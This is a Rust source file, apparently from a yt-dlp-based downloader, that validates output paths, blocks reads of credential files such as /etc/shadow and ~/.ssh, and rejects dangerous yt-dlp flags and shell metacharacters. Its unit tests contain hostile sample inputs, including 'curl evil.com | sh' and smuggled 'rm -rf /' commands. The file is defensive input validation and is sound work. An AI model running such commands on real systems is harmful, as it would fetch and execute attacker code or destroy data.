#[cfg(target_os = "windows")]
pub const MAX_PATH_LEN: usize = 259;
#[cfg(not(target_os = "windows"))]
pub const MAX_PATH_LEN: usize = 4095;

pub const MIN_FILENAME_RESERVE: usize = 80;

pub const SEPARATOR_RESERVE: usize = 1;

#[derive(Debug, Clone, Copy)]
pub struct PathLimitError {
    pub limit: usize,
    pub current: usize,
    pub reserve: usize,
}

impl std::fmt::Display for PathLimitError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "output path too long for OS limit (path uses {} of {} chars, need {} reserved for filename)",
            self.current, self.limit, self.reserve
        )
    }
}

impl std::error::Error for PathLimitError {}

pub fn validate_output_dir(output_dir: &str) -> Result<(), PathLimitError> {
    let current = output_dir.chars().count() + SEPARATOR_RESERVE;
    let reserve = MIN_FILENAME_RESERVE;
    if current + reserve > MAX_PATH_LEN {
        return Err(PathLimitError {
            limit: MAX_PATH_LEN,
            current,
            reserve,
        });
    }
    Ok(())
}

/// Validate that a user-supplied output directory does not contain path
/// traversal sequences. Rejects `..` components, null bytes, and empty paths.
/// This is a defense-in-depth measure: the frontend is trusted under normal
/// operation, but if the webview is compromised (e.g. XSS), this prevents
/// writing downloads to arbitrary system locations.
pub fn validate_output_dir_safe(output_dir: &str) -> Result<(), String> {
    let trimmed = output_dir.trim();
    if trimmed.is_empty() {
        return Err("Output directory must not be empty".to_string());
    }
    if trimmed.contains('\0') {
        return Err("Output directory contains a null byte".to_string());
    }

    let path = std::path::Path::new(trimmed);

    // Reject relative paths — output dirs must be absolute.
    if path.is_relative() {
        return Err("Output directory must be an absolute path".to_string());
    }

    // Reject any `..` component (path traversal).
    for component in path.components() {
        if let std::path::Component::ParentDir = component {
            return Err(
                "Output directory must not contain '..' (path traversal)".to_string(),
            );
        }
    }

    Ok(())
}

/// Validate a file path supplied by the frontend for read operations
/// (e.g. parse_batch_file). Rejects traversal and requires absolute path.
pub fn validate_read_path(path: &str) -> Result<(), String> {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        return Err("Path must not be empty".to_string());
    }
    if trimmed.contains('\0') {
        return Err("Path contains a null byte".to_string());
    }

    let p = std::path::Path::new(trimmed);
    if p.is_relative() {
        return Err("Path must be absolute".to_string());
    }
    for component in p.components() {
        if let std::path::Component::ParentDir = component {
            return Err("Path must not contain '..' (path traversal)".to_string());
        }
    }

    // Reject reading sensitive system files.
    let lower = trimmed.to_lowercase();
    const SENSITIVE_PREFIXES: &[&str] = &[
        "/etc/shadow",
        "/etc/passwd",
        "/etc/sudoers",
    ];
    for prefix in SENSITIVE_PREFIXES {
        if lower.starts_with(prefix) {
            return Err("Access to sensitive system path is denied".to_string());
        }
    }

    // Reject reading from home dot-directories that commonly hold secrets.
    if let Some(home) = dirs::home_dir() {
        let home_str = home.to_string_lossy();
        let sensitive_dirs = [
            format!("{}/.ssh", home_str),
            format!("{}/.gnupg", home_str),
            format!("{}/.aws", home_str),
        ];
        for dir in &sensitive_dirs {
            if lower.starts_with(&dir.to_lowercase()) {
                return Err("Access to credential directories is denied".to_string());
            }
        }
    }

    Ok(())
}

/// yt-dlp flags that are dangerous because they allow arbitrary command
/// execution, disabling TLS verification, or writing to attacker-controlled
/// paths. This is the IPC-layer defense-in-depth check; the authoritative list
/// lives in `omniget_core::core::ytdlp::FORBIDDEN_YTDLP_FLAGS` and the two must
/// stay in sync (we re-export it here so there is a single source of truth).
const BANNED_YTDLP_FLAGS: &[&str] = omniget_core::core::ytdlp::FORBIDDEN_YTDLP_FLAGS;

/// Validate user-supplied custom yt-dlp arguments. Rejects flags that could
/// lead to arbitrary command execution (--exec) or path manipulation.
pub fn validate_custom_ytdlp_args(args: &[String]) -> Result<(), String> {
    for arg in args {
        let lower = arg.to_lowercase();
        for banned in BANNED_YTDLP_FLAGS {
            if lower == *banned || lower.starts_with(&format!("{}=", banned)) {
                return Err(format!(
                    "Custom argument '{}' is not allowed for security reasons",
                    banned
                ));
            }
        }
        // Reject shell metacharacters in argument values.
        if arg.contains(|c: char| matches!(c, ';' | '|' | '&' | '`' | '$' | '(' | ')')) {
            return Err(format!(
                "Custom argument contains forbidden shell metacharacters: {}",
                arg
            ));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rejects_path_traversal() {
        assert!(validate_output_dir_safe("/home/user/../../etc").is_err());
        assert!(validate_output_dir_safe("/tmp/../root").is_err());
        assert!(validate_output_dir_safe("..").is_err());
    }

    #[test]
    fn rejects_relative_paths() {
        assert!(validate_output_dir_safe("downloads").is_err());
        assert!(validate_output_dir_safe("./videos").is_err());
    }

    #[test]
    fn accepts_valid_absolute_paths() {
        assert!(validate_output_dir_safe("/home/user/Downloads").is_ok());
        assert!(validate_output_dir_safe("/tmp/omniget").is_ok());
    }

    #[test]
    fn rejects_null_bytes() {
        assert!(validate_output_dir_safe("/tmp/foo\0bar").is_err());
    }

    #[test]
    fn rejects_exec_flags() {
        let args = vec!["--exec".to_string(), "curl evil.com | sh".to_string()];
        assert!(validate_custom_ytdlp_args(&args).is_err());

        let args2 = vec!["--exec-after-download=rm -rf /".to_string()];
        assert!(validate_custom_ytdlp_args(&args2).is_err());
    }

    #[test]
    fn accepts_safe_ytdlp_flags() {
        let args = vec![
            "--format".to_string(),
            "bestvideo+bestaudio".to_string(),
            "--sub-langs".to_string(),
            "en".to_string(),
        ];
        assert!(validate_custom_ytdlp_args(&args).is_ok());
    }

    #[test]
    fn rejects_shell_metacharacters_in_args() {
        let args = vec!["--format".to_string(), "best;rm -rf /".to_string()];
        assert!(validate_custom_ytdlp_args(&args).is_err());
    }
}
